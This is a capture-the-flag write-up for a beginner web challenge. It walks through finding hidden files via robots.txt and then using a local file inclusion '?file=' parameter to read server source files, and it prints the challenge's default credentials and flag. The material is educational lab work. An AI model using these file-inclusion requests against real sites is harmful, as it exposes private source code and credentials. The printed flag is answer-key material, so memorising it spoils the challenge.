# Brick by Brick CTF - Solution Writeup

## Challenge Overview
**Name:** Brick by Brick
**Points:** 100
**Category:** web easy
**Author:** Michael/michaelye_22

**Description:**
> I found this old portal for BrickWorks Co. They say their internal systems are secure, but I'm not so sure. Can you find the hidden admin dashboard and get the flag?

**Target URL:** `http://brick-by-brick.web.ctf.umasscybersec.org:32769`

**Hints Provided:**
1. What files do web servers usually use to hide things from search engines?
2. Look closely at the URL parameters when reading documents.

---

## Step-by-Step Walkthrough

### Step 1: Investigating the Hints (`robots.txt`)
The first hint asked about files used to hide things from search engines. This is a direct reference to the `robots.txt` file, which is an industry standard for instructing web crawlers which pages or files they can or cannot request from a site.

Navigating to `http://.../robots.txt` yields the following:

```text
User-agent: *
Disallow: /internal-docs/assembly-guide.txt
Disallow: /internal-docs/it-onboarding.txt
Disallow: /internal-docs/q3-report.txt

# NOTE: Maintenance in progress. 
# Unauthorized crawling of /internal-docs/ is prohibited.
```

This successfully exposes a hidden directory (`/internal-docs/`) containing text files.

### Step 2: Information Gathering (`it-onboarding.txt`)
We can directly access the files listed in `robots.txt`. Let's inspect `http://.../internal-docs/it-onboarding.txt`:

```text
================================================================
  BRICKWORKS CO. — IT ONBOARDING GUIDE
================================================================

...
----------------------------------------------------------------
SECTION 1 - DOCUMENT PORTAL
----------------------------------------------------------------

The internal document portal lives at our main intranet address.
Staff can access any file using the ?file= parameter:

----------------------------------------------------------------
SECTION 2 - ADMIN DASHBOARD
----------------------------------------------------------------

Credentials are stored in the application config file
for reference by the IT team. See config.php in the web root.

...
```

This onboarding document provides two crucial pieces of information:
1. The site is running a document portal on the main page (`index.php`) utilizing a `?file=` parameter for Local File Inclusion (LFI). 
2. There is a `config.php` file in the web root containing admin credentials.

### Step 3: Exploiting Local File Inclusion (LFI)
The second hint advised us to "Look closely at the URL parameters when reading documents." Given that the portal uses `?file=`, we can exploit this LFI vulnerability to read local source files rather than just normal documents.

To view the config file mentioned in the onboarding document, we navigate to:
`http://.../index.php?file=config.php`

Checking the page's source code output reveals the PHP configuration script:

```php
<?php
// BrickWorks Co. — Application Configuration
// WARNING: Do not expose this file publicly!

// The admin dashboard is located at /dashboard-admin.php.

// Database
define('DB_HOST', 'localhost');
define('DB_NAME', 'brickworks');
...
// WARNING: SYSTEM IS CURRENTLY USING DEFAULT FACTORY CREDENTIALS.
// TODO: Change 'administrator' account from default password.
define('ADMIN_USER', 'administrator');
define('ADMIN_PASS', '[deleted it for safety reasons - Tom]');
...
?>
```

`config.php` reveals the exact path of the admin dashboard: `/dashboard-admin.php`. Although the password in the config file was redacted with the note `[deleted it for safety reasons - Tom]`, the file specifically mentions that the system is currently using "DEFAULT FACTORY CREDENTIALS." 

### Step 4: Extracting the Flag
We could try to guess the default factory credentials (e.g., `administrator` / `administrator`) to log into the `/dashboard-admin.php` page. However, because we already have an LFI vulnerability, we can simply read the underlying source code of the admin dashboard directly!

We use LFI again by navigating to:
`http://.../index.php?file=dashboard-admin.php`

Checking the outputted source code, we see the top of `dashboard-admin.php`, which contains the hardcoded flag directly in its logic:

```php
<?php
session_start();

// Default credentials - intentionally weak for CTF
define('DASHBOARD_USER', 'administrator');
define('DASHBOARD_PASS', 'administrator');

define('FLAG', 'UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}');

...
?>
```

## Solution
The challenge is completed by finding the LFI vector that allows us to expose PHP source code files, eventually leading us to the hardcoded flag. 

**Flag:** `UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}`
